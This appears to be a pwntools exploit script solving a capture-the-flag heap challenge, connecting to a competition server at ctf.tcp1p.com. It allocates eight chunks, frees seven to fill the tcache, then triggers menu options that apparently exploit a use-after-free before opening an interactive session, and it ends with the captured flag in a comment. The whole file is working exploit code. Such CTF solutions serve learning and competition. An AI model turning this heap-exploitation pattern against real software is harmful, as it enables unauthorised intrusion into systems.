#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ctf.tcp1p.com', 4267)
else:
        p = process(exe.path)

GDB()
def create(idx):
        sla(b'> ', '1')
        sla(b': ', str(idx))
        sla(b': ', str(112))
        sla(b': ', 'wan')
def delete(idx):
        sla(b'> ', '2')
        sla(b': ', str(idx))
create(1)    
create(2)    
create(3)    
create(4)  
create(5)  
create(6)  
create(7)  
create(8)  

delete(1)    
delete(2)    
delete(3)    
delete(5)  
delete(6)  
delete(7)  
delete(8)  
sla(b'> ', '4')
sla(b'> ', '3')
sla(b': ', str(3))
  
p.interactive()
# TCP1P{k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle???}